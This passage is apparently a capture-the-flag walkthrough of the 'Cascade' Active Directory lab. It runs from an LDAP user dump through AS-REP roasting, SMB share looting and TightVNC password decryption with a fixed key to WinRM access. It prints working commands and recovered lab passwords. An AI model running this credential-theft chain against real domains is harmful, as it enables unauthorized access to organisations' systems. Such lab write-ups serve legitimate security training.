dNSHostName: CASC-DC1.cascade.local
rIDSetReferences: CN=RID Set,CN=CASC-DC1,OU=Domain Controllers,DC=cascade,DC=l
 ocal
servicePrincipalName: TERMSRV/CASC-DC1
servicePrincipalName: TERMSRV/CASC-DC1.cascade.local
servicePrincipalName: ldap/CASC-DC1.cascade.local/ForestDnsZones.cascade.local
servicePrincipalName: ldap/CASC-DC1.cascade.local/DomainDnsZones.cascade.local
servicePrincipalName: Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/CASC-DC1.casca
 de.local
servicePrincipalName: DNS/CASC-DC1.cascade.local
servicePrincipalName: GC/CASC-DC1.cascade.local/cascade.local
servicePrincipalName: RestrictedKrbHost/CASC-DC1.cascade.local
servicePrincipalName: RestrictedKrbHost/CASC-DC1
servicePrincipalName: HOST/CASC-DC1/CASCADE
servicePrincipalName: HOST/CASC-DC1.cascade.local/CASCADE
servicePrincipalName: HOST/CASC-DC1
servicePrincipalName: HOST/CASC-DC1.cascade.local
servicePrincipalName: HOST/CASC-DC1.cascade.local/cascade.local
servicePrincipalName: E3514235-4B06-11D1-AB04-00C04FC2DCD2/8bfc9a6c-6edc-45bd-
 9e27-251f9de2d5f7/cascade.local
servicePrincipalName: ldap/CASC-DC1/CASCADE
servicePrincipalName: ldap/8bfc9a6c-6edc-45bd-9e27-251f9de2d5f7._msdcs.cascade
 .local
servicePrincipalName: ldap/CASC-DC1.cascade.local/CASCADE
servicePrincipalName: ldap/CASC-DC1
servicePrincipalName: ldap/CASC-DC1.cascade.local
servicePrincipalName: ldap/CASC-DC1.cascade.local/cascade.local
objectCategory: CN=Computer,CN=Schema,CN=Configuration,DC=cascade,DC=local
isCriticalSystemObject: TRUE
dSCorePropagationData: 20200117033736.0Z
dSCorePropagationData: 20200117001404.0Z
dSCorePropagationData: 20200109175934.0Z
dSCorePropagationData: 20200109154857.0Z
dSCorePropagationData: 16010714223649.0Z
lastLogonTimestamp: 132817249952809263
msDS-SupportedEncryptionTypes: 31
msDFSR-ComputerReferenceBL: CN=CASC-DC1,CN=Topology,CN=Domain System Volume,CN
 =DFSR-GlobalSettings,CN=System,DC=cascade,DC=local

dn: CN=ArkSvc,OU=Services,OU=Users,OU=UK,DC=cascade,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: ArkSvc
distinguishedName: CN=ArkSvc,OU=Services,OU=Users,OU=UK,DC=cascade,DC=local
instanceType: 4
whenCreated: 20200109161820.0Z
whenChanged: 20200323113833.0Z
displayName: ArkSvc
uSNCreated: 12799
memberOf: CN=Remote Management Users,OU=Groups,OU=UK,DC=cascade,DC=local
memberOf: CN=AD Recycle Bin,OU=Groups,OU=UK,DC=cascade,DC=local
memberOf: CN=IT,OU=Groups,OU=UK,DC=cascade,DC=local
uSNChanged: 295021
name: ArkSvc
objectGUID:: ELXj5FhFXUmr2tAqpnaTNA==
userAccountControl: 66048
badPwdCount: 19
codePage: 0
countryCode: 0
badPasswordTime: 132817324189751653
lastLogoff: 0
lastLogon: 132248055409887841
pwdLastSet: 132230603002172876
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJFUgQAAA==
accountExpires: 9223372036854775807
logonCount: 13
sAMAccountName: arksvc
sAMAccountType: 805306368
userPrincipalName: arksvc@cascade.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local
dSCorePropagationData: 20200117033736.0Z
dSCorePropagationData: 20200117001404.0Z
dSCorePropagationData: 20200113163635.0Z
dSCorePropagationData: 20200113163628.0Z
dSCorePropagationData: 16010101000417.0Z
lastLogonTimestamp: 132294371134322815

dn: CN=Steve Smith,OU=Users,OU=UK,DC=cascade,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Steve Smith
sn: Smith
givenName: Steve
distinguishedName: CN=Steve Smith,OU=Users,OU=UK,DC=cascade,DC=local
instanceType: 4
whenCreated: 20200109180813.0Z
whenChanged: 20200323113113.0Z
displayName: Steve Smith
uSNCreated: 16404
memberOf: CN=Audit Share,OU=Groups,OU=UK,DC=cascade,DC=local
memberOf: CN=Remote Management Users,OU=Groups,OU=UK,DC=cascade,DC=local
memberOf: CN=IT,OU=Groups,OU=UK,DC=cascade,DC=local
uSNChanged: 295015
name: Steve Smith
objectGUID:: 39nrOPfEAE2an/UDQy/6fQ==
userAccountControl: 66048
badPwdCount: 19
codePage: 0
countryCode: 0
badPasswordTime: 132817324192559658
lastLogoff: 0
lastLogon: 132247275990842339
scriptPath: MapAuditDrive.vbs
pwdLastSet: 132247150854857364
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJFUwQAAA==
accountExpires: 9223372036854775807
logonCount: 16
sAMAccountName: s.smith
sAMAccountType: 805306368
userPrincipalName: s.smith@cascade.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local
dSCorePropagationData: 20200117033736.0Z
dSCorePropagationData: 20200117001404.0Z
dSCorePropagationData: 20200113163628.0Z
dSCorePropagationData: 20200109180813.0Z
dSCorePropagationData: 16010101000417.0Z
lastLogonTimestamp: 132294366735115088

dn: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Ryan Thompson
sn: Thompson
givenName: Ryan
distinguishedName: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local
instanceType: 4
whenCreated: 20200109193126.0Z
whenChanged: 20200323112031.0Z
displayName: Ryan Thompson
uSNCreated: 24610
memberOf: CN=IT,OU=Groups,OU=UK,DC=cascade,DC=local
uSNChanged: 295010
name: Ryan Thompson
objectGUID:: LfpD6qngUkupEy9bFXBBjA==
userAccountControl: 66048
badPwdCount: 19
codePage: 0
countryCode: 0
badPasswordTime: 132817324195211663
lastLogoff: 0
lastLogon: 132247339125713230
pwdLastSet: 132230718862636251
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJFVQQAAA==
accountExpires: 9223372036854775807
logonCount: 2
sAMAccountName: r.thompson
sAMAccountType: 805306368
userPrincipalName: r.thompson@cascade.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local
dSCorePropagationData: 20200126183918.0Z
dSCorePropagationData: 20200119174753.0Z
dSCorePropagationData: 20200119174719.0Z
dSCorePropagationData: 20200119174508.0Z
dSCorePropagationData: 16010101000000.0Z
lastLogonTimestamp: 132294360317419816
msDS-SupportedEncryptionTypes: 0
cascadeLegacyPwd: clk0bjVldmE=

dn: CN=Util,OU=Services,OU=Users,OU=UK,DC=cascade,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Util
distinguishedName: CN=Util,OU=Services,OU=Users,OU=UK,DC=cascade,DC=local
instanceType: 4
whenCreated: 20200109194521.0Z
whenChanged: 20200128180947.0Z
displayName: Util
uSNCreated: 24650
uSNChanged: 245850
name: Util
objectGUID:: GdAgZzaP8E6S7CzuIP8sag==
userAccountControl: 66048
badPwdCount: 19
codePage: 0
countryCode: 0
badPasswordTime: 132817324198019668
lastLogoff: 0
lastLogon: 132247085871071226
pwdLastSet: 132233548311955855
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJFVwQAAA==
accountExpires: 9223372036854775807
logonCount: 1
sAMAccountName: util
sAMAccountType: 805306368
userPrincipalName: util@cascade.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local
dSCorePropagationData: 20200117033736.0Z
dSCorePropagationData: 20200117001404.0Z
dSCorePropagationData: 20200113163635.0Z
dSCorePropagationData: 20200113163628.0Z
dSCorePropagationData: 16010101000417.0Z
lastLogonTimestamp: 132247085871071226

dn: CN=James Wakefield,OU=Users,OU=UK,DC=cascade,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: James Wakefield
sn: Wakefield
givenName: James
distinguishedName: CN=James Wakefield,OU=Users,OU=UK,DC=cascade,DC=local
instanceType: 4
whenCreated: 20200109203444.0Z
whenChanged: 20200115215201.0Z
displayName: James Wakefield
uSNCreated: 28741
uSNChanged: 118849
name: James Wakefield
objectGUID:: 6SX/H/Sf5UOkC8IjbIii7A==
userAccountControl: 66048
badPwdCount: 19
codePage: 0
countryCode: 0
badPasswordTime: 132817324200827673
lastLogoff: 0
lastLogon: 0
scriptPath: MapDataDrive.vbs
pwdLastSet: 132230756844150124
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJFXAQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: j.wakefield
sAMAccountType: 805306368
userPrincipalName: j.wakefield@cascade.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local
dSCorePropagationData: 20200117033736.0Z
dSCorePropagationData: 20200117001404.0Z
dSCorePropagationData: 20200113163628.0Z
dSCorePropagationData: 20200109203444.0Z
dSCorePropagationData: 16010101000417.0Z

dn: CN=Stephanie Hickson,OU=Users,OU=UK,DC=cascade,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Stephanie Hickson
sn: Hickson
givenName: Stephanie
distinguishedName: CN=Stephanie Hickson,OU=Users,OU=UK,DC=cascade,DC=local
instanceType: 4
whenCreated: 20200113012427.0Z
whenChanged: 20200115215221.0Z
displayName: Stephanie Hickson
uSNCreated: 65594
memberOf: CN=HR,OU=Groups,OU=UK,DC=cascade,DC=local
uSNChanged: 118853
name: Stephanie Hickson
objectGUID:: rCGbAiT7r0CiOzKwLPa8NQ==
userAccountControl: 66048
badPwdCount: 19
codePage: 0
countryCode: 0
badPasswordTime: 132817324203635678
lastLogoff: 0
lastLogon: 0
scriptPath: MapDataDrive.vbs
pwdLastSet: 132233522678003963
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJFYQQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: s.hickson
sAMAccountType: 805306368
userPrincipalName: s.hickson@cascade.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local
dSCorePropagationData: 20200117033736.0Z
dSCorePropagationData: 20200117001404.0Z
dSCorePropagationData: 20200113163628.0Z
dSCorePropagationData: 20200113012427.0Z
dSCorePropagationData: 16010101000417.0Z

dn: CN=John Goodhand,OU=Users,OU=UK,DC=cascade,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: John Goodhand
sn: Goodhand
givenName: John
distinguishedName: CN=John Goodhand,OU=Users,OU=UK,DC=cascade,DC=local
instanceType: 4
whenCreated: 20200113014026.0Z
whenChanged: 20200115215154.0Z
displayName: John Goodhand
uSNCreated: 65614
uSNChanged: 118848
name: John Goodhand
objectGUID:: 7TACWgpE/kqlMHRot3JgpQ==
userAccountControl: 66048
badPwdCount: 19
codePage: 0
countryCode: 0
badPasswordTime: 132817324206287682
lastLogoff: 0
lastLogon: 0
scriptPath: MapDataDrive.vbs
pwdLastSet: 132233532260320793
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJFYgQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: j.goodhand
sAMAccountType: 805306368
userPrincipalName: j.goodhand@cascade.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local
dSCorePropagationData: 20200117033736.0Z
dSCorePropagationData: 20200117001404.0Z
dSCorePropagationData: 20200113163628.0Z
dSCorePropagationData: 20200113014026.0Z
dSCorePropagationData: 16010101000417.0Z

dn: CN=Adrian Turnbull,OU=Users,OU=UK,DC=cascade,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Adrian Turnbull
sn: Turnbull
givenName: Adrian
distinguishedName: CN=Adrian Turnbull,OU=Users,OU=UK,DC=cascade,DC=local
instanceType: 4
whenCreated: 20200113014313.0Z
whenChanged: 20200113034534.0Z
displayName: Adrian Turnbull
uSNCreated: 65635
uSNChanged: 94281
name: Adrian Turnbull
objectGUID:: PkhsX7HK0UKVFdwqFTWrnQ==
userAccountControl: 66080
badPwdCount: 19
codePage: 0
countryCode: 0
badPasswordTime: 132817324209251687
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132233533933579732
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJFZAQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: a.turnbull
sAMAccountType: 805306368
userPrincipalName: a.turnbull@cascade.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local
dSCorePropagationData: 20200117033736.0Z
dSCorePropagationData: 20200117001404.0Z
dSCorePropagationData: 20200113163628.0Z
dSCorePropagationData: 20200113015223.0Z
dSCorePropagationData: 16030216172521.0Z
msDS-SupportedEncryptionTypes: 0

dn: CN=Edward Crowe,OU=Users,OU=UK,DC=cascade,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Edward Crowe
sn: Crowe
givenName: Edward
distinguishedName: CN=Edward Crowe,OU=Users,OU=UK,DC=cascade,DC=local
instanceType: 4
whenCreated: 20200113034502.0Z
whenChanged: 20200128180707.0Z
displayName: Edward Crowe
uSNCreated: 94274
uSNChanged: 245840
name: Edward Crowe
objectGUID:: spB7cioaike11C+BNt/oVg==
userAccountControl: 66050
badPwdCount: 19
codePage: 0
countryCode: 0
badPasswordTime: 132817324211903692
lastLogoff: 0
lastLogon: 0
scriptPath: MapDataDrive.vbs
pwdLastSet: 132233607021669462
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJFZwQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: e.crowe
sAMAccountType: 805306368
userPrincipalName: e.crowe@cascade.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local
dSCorePropagationData: 20200117033736.0Z
dSCorePropagationData: 20200117001404.0Z
dSCorePropagationData: 20200113163628.0Z
dSCorePropagationData: 20200113034502.0Z
dSCorePropagationData: 16010101000417.0Z

dn: CN=Ben Hanson,OU=Users,OU=UK,DC=cascade,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Ben Hanson
sn: Hanson
givenName: Ben
distinguishedName: CN=Ben Hanson,OU=Users,OU=UK,DC=cascade,DC=local
instanceType: 4
whenCreated: 20200113163539.0Z
whenChanged: 20200128180729.0Z
displayName: Ben Hanson
uSNCreated: 114734
uSNChanged: 245841
name: Ben Hanson
objectGUID:: aiS9+OrNYE6UJnr8wuBpHg==
userAccountControl: 66050
badPwdCount: 19
codePage: 0
countryCode: 0
badPasswordTime: 132817324214711697
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132234069391538655
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJFaAQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: b.hanson
sAMAccountType: 805306368
userPrincipalName: b.hanson@cascade.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local
dSCorePropagationData: 20200117033736.0Z
dSCorePropagationData: 20200117001404.0Z
dSCorePropagationData: 20200113163628.0Z
dSCorePropagationData: 20200113163539.0Z
dSCorePropagationData: 16010101000417.0Z

dn: CN=David Burman,OU=Users,OU=UK,DC=cascade,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: David Burman
sn: Burman
givenName: David
distinguishedName: CN=David Burman,OU=Users,OU=UK,DC=cascade,DC=local
instanceType: 4
whenCreated: 20200113163612.0Z
whenChanged: 20200115215216.0Z
displayName: David Burman
uSNCreated: 114742
uSNChanged: 118852
name: David Burman
objectGUID:: UqmXwgkl/0iy14P121+N7A==
userAccountControl: 66048
badPwdCount: 19
codePage: 0
countryCode: 0
badPasswordTime: 132817324217363702
lastLogoff: 0
lastLogon: 0
scriptPath: MapDataDrive.vbs
pwdLastSet: 132234069729591249
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJFaQQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: d.burman
sAMAccountType: 805306368
userPrincipalName: d.burman@cascade.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local
dSCorePropagationData: 20200117033736.0Z
dSCorePropagationData: 20200117001404.0Z
dSCorePropagationData: 20200113163628.0Z
dSCorePropagationData: 20200113163613.0Z
dSCorePropagationData: 16010101000417.0Z

dn: CN=BackupSvc,OU=Services,OU=Users,OU=UK,DC=cascade,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: BackupSvc
givenName: BackupSvc
distinguishedName: CN=BackupSvc,OU=Services,OU=Users,OU=UK,DC=cascade,DC=local
instanceType: 4
whenCreated: 20200113163703.0Z
whenChanged: 20200113163732.0Z
displayName: BackupSvc
uSNCreated: 114757
uSNChanged: 114765
name: BackupSvc
objectGUID:: /AeVxvZYJ0S4xu2RXKx+KA==
userAccountControl: 66048
badPwdCount: 19
codePage: 0
countryCode: 0
badPasswordTime: 132817324220327707
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132234070231912131
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJFagQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: BackupSvc
sAMAccountType: 805306368
userPrincipalName: BackupSvc@cascade.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local
dSCorePropagationData: 20200117033736.0Z
dSCorePropagationData: 20200117001404.0Z
dSCorePropagationData: 20200113163703.0Z
dSCorePropagationData: 16010101000417.0Z

dn: CN=Joseph Allen,OU=Users,OU=UK,DC=cascade,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Joseph Allen
sn: Allen
givenName: Joseph
distinguishedName: CN=Joseph Allen,OU=Users,OU=UK,DC=cascade,DC=local
instanceType: 4
whenCreated: 20200113172359.0Z
whenChanged: 20200115215149.0Z
displayName: Joseph Allen
uSNCreated: 114807
uSNChanged: 118847
name: Joseph Allen
objectGUID:: HEPoVWJubkGd3J25ACGaRA==
userAccountControl: 66048
badPwdCount: 19
codePage: 0
countryCode: 0
badPasswordTime: 132817324223447712
lastLogoff: 0
lastLogon: 0
scriptPath: MapDataDrive.vbs
pwdLastSet: 132234098399165604
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJFbgQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: j.allen
sAMAccountType: 805306368
userPrincipalName: j.allen@cascade.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local
dSCorePropagationData: 20200117033736.0Z
dSCorePropagationData: 20200117001404.0Z
dSCorePropagationData: 20200113172359.0Z
dSCorePropagationData: 16010101000417.0Z

dn: CN=Ian Croft,OU=Users,OU=UK,DC=cascade,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Ian Croft
sn: Croft
givenName: Ian
distinguishedName: CN=Ian Croft,OU=Users,OU=UK,DC=cascade,DC=local
instanceType: 4
whenCreated: 20200115214621.0Z
whenChanged: 20200128180700.0Z
displayName: Ian Croft
uSNCreated: 118835
uSNChanged: 245839
name: Ian Croft
objectGUID:: nRdObhMYfkOzzZt2y5gHxw==
userAccountControl: 66050
badPwdCount: 19
codePage: 0
countryCode: 0
badPasswordTime: 132817324226099717
lastLogoff: 0
lastLogon: 0
scriptPath: MapDataDrive.vbs
pwdLastSet: 132235983818652005
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJFbwQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: i.croft
sAMAccountType: 805306368
userPrincipalName: i.croft@cascade.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local
dSCorePropagationData: 20200117033736.0Z
dSCorePropagationData: 20200117001404.0Z
dSCorePropagationData: 20200115214621.0Z
dSCorePropagationData: 16010101000417.0Z
```

It appears that many users have the `scriptPath` attribute defined as `MapDataDrive.vbs`. For these users, this script is executed whenever they log in.

Filter away all of the common user attributes from the above output.

```bash
$ cat ldap-users.txt | grep -v -f attrs.txt

name: CASC-DC1
localPolicyFlags: 0
 CN=Configuration,DC=cascade,DC=local
rIDSetReferences: CN=RID Set,CN=CASC-DC1,OU=Domain Controllers,DC=cascade,DC=l
 ocal
 de.local
 9e27-251f9de2d5f7/cascade.local
 .local

name: ArkSvc

name: Steve Smith

name: Ryan Thompson
cascadeLegacyPwd: clk0bjVldmE=

name: Util

name: James Wakefield

name: Stephanie Hickson

name: John Goodhand

name: Adrian Turnbull

name: Edward Crowe

name: Ben Hanson

name: David Burman

name: BackupSvc

name: Joseph Allen

name: Ian Croft
```

The user account `r.thompson` has a non-standard attribute `cascadeLegacyPwd` with the value `clk0bjVldmE=`. This appears to be a legacy password. Base64  decoding it yields the password `rY4n5eva`.

---

## ASREP Roasting

Attempt to ASREP Roast the user accounts gathered from LDAP to see if it is possible to compromise any other user accounts.

```bash
$ impacket-GetNPUsers -dc-ip 10.129.203.112 cascade.local/ -usersfile users.txt -format hashcat
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User CASC-DC1$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User arksvc doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User s.smith doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User r.thompson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User util doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User j.wakefield doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User s.hickson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User j.goodhand doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User a.turnbull doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User d.burman doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User BackupSvc doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User j.allen doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
```

All of the accounts require Kerberos pre-authentication and thus, none are vulnerable to ASREP Roasting. The output indicates that the user accounts `CascGuest`, `e.crowe`, `b.hanson`, and `i.croft` have all had their credentials revoked.

---

## `r.thompson`'s Domain Graph

Use the credential `r.thompson`:`rY4n5eva` to graph the relationship between the principals in the domain.

```bash
$ bloodhound-python -d cascade.local -u r.thompson -p rY4n5eva -c All -ns 10.129.203.112
INFO: Found AD domain: cascade.local
INFO: Connecting to LDAP server: casc-dc1.cascade.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: casc-dc1.cascade.local
INFO: Found 17 users
INFO: Found 52 groups
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: CASC-DC1.cascade.local
INFO: Done in 00M 07S
```

`r.thompson` is a member of the `IT` group.

![](images/Pasted%20image%2020211118144639.png)

`r.thompson`, as a member of the `Domain Admins` group, is also a member of the `Data Share` group.

![](images/Pasted%20image%2020211118145324.png)

---

## SMB Enumeration as `r.thompson`

```bash
$ smbmap -u "r.thompson" -p "rY4n5eva" -P 445 -H 10.129.203.112
[+] IP: 10.129.203.112:445      Name: 10.129.203.112
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        Audit$                                                  NO ACCESS
        C$                                                      NO ACCESS       Default share
        Data                                                    READ ONLY
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share
        print$                                                  READ ONLY       Printer Drivers
        SYSVOL                                                  READ ONLY       Logon server share
```

`r.thompson` has access to the `Data`, `print$`, `NETLOGON`, and `SYSVOL` shares.

### `Data` Share

```bash
$ smbclient -U cascade.local/r.thompson //10.129.203.112/Data
Enter CASCADE.LOCAL\r.thompson's password:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Jan 26 22:27:34 2020
  ..                                  D        0  Sun Jan 26 22:27:34 2020
  Contractors                         D        0  Sun Jan 12 20:45:11 2020
  Finance                             D        0  Sun Jan 12 20:45:06 2020
  IT                                  D        0  Tue Jan 28 13:04:51 2020
  Production                          D        0  Sun Jan 12 20:45:18 2020
  Temps                               D        0  Sun Jan 12 20:45:15 2020

                6553343 blocks of size 4096. 1625753 blocks available
```

The only readable folder in the share is `IT`. Recursively download it.

```bash
$ smbget --user=r.thompson -R smb://10.129.203.112/Data/IT
Password for [r.thompson] connecting to //Data/10.129.203.112:
Using workgroup WORKGROUP, user r.thompson
smb://10.129.203.112/Data/IT/Email Archives/Meeting_Notes_June_2018.html
smb://10.129.203.112/Data/IT/Logs/Ark AD Recycle Bin/ArkAdRecycleBin.log
smb://10.129.203.112/Data/IT/Logs/DCs/dcdiag.log
smb://10.129.203.112/Data/IT/Temp/s.smith/VNC Install.reg
Downloaded 12.18kB in 10 seconds
```

### `print$` Share

```bash
$ smbclient -U cascade.local/r.thompson '//10.129.203.112/print$'
Enter CASCADE.LOCAL\r.thompson's password:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Jul 14 01:37:10 2009
  ..                                  D        0  Tue Jul 14 01:37:10 2009
  color                               D        0  Tue Jul 14 01:37:10 2009
  IA64                                D        0  Tue Jul 14 00:58:30 2009
  W32X86                              D        0  Tue Jul 14 00:58:30 2009
  x64                                 D        0  Sun Jan 12 22:09:11 2020

                6553343 blocks of size 4096. 1625493 blocks available
```

### `NETLOGON` Share

```bash
$ smbclient -U cascade.local/r.thompson //10.129.203.112/NETLOGON
Enter CASCADE.LOCAL\r.thompson's password:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jan 15 16:50:33 2020
  ..                                  D        0  Wed Jan 15 16:50:33 2020
  MapAuditDrive.vbs                   A      258  Wed Jan 15 16:50:15 2020
  MapDataDrive.vbs                    A      255  Wed Jan 15 16:51:03 2020

                6553343 blocks of size 4096. 1625751 blocks available
```

### `SYSVOL` Share

```bash
$ smbclient -U cascade.local/r.thompson //10.129.203.112/SYSVOL
Enter CASCADE.LOCAL\r.thompson's password:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Jan  9 10:31:27 2020
  ..                                  D        0  Thu Jan  9 10:31:27 2020
  cascade.local                      Dr        0  Thu Jan  9 10:31:27 2020

                6553343 blocks of size 4096. 1625751 blocks available
```

---

 ## Deleted `TempAdmin` Account

The archived email `Data/IT/Email Archives/Meeting_Notes_June_2018.html` states that the target organization was using a temporary administrator account, `TempAdmin`, during the migration of its security logs.

The file `Data/IT/Logs/Ark AD Recycle Bin/ArkAdRecycleBin.log` indicates that  the `TempAdmin` user account was moved into the `AD Recycle Bin` with the new location of `CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local`.

However, attempting to retrieve the deleted object fails.

```bash
$ ldapsearch -LLL -x -h 10.129.203.112 -b 'CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local'
No such object (32)
Matched DN: CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
Additional information: 0000208D: NameErr: DSID-0310020A, problem 2001 (NO_OBJECT), data 0, best match of:
        'CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local'
```

---

## Decrypting `s.smith`'s TightVNC Password

The file `Data/IT/Temp/s.smith/VNC Install.reg` contains Windows registry data on the target's `Tight VNC` installation, presumably for the user `s.smith`. It contains the following line: `"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f`. [This Github repository](https://github.com/frizb/PasswordDecrypts) indicates that VNC stores its password encrypted with a fixed key and that it is possible to decrypt any stored VNC passwords with the following:

```bash
$ echo -n 6bcf2a4b6e5aca0f | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv
00000000  73 54 33 33 33 76 65 32                           |sT333ve2|
00000008
```

`s.smith`'s password is `sT333ve2`.

```bash
$ crackmapexec smb 10.129.203.112 -d cascade.local -u s.smith -p 'sT333ve2'
SMB         10.129.203.112  445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.129.203.112  445    CASC-DC1         [+] cascade.local\s.smith:sT333ve2
```

---

## `s.smith`'s Domain Graph

`s.smith` is a member of several non-standard groups, including `Audit Share`, `Remote Management Users`, and `IT`.

![](images/Pasted%20image%2020211118161134.png)

---

## WinRM Access as `s.smith`

As a member of the `Remote Management Users` group, `s.smith` can access the target via WinRM. Grab the user flag from `s.smith`'s desktop.

```bash
$ evil-winrm -i 10.129.203.112 -u cascade.local\\s.smith -p sT333ve2

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

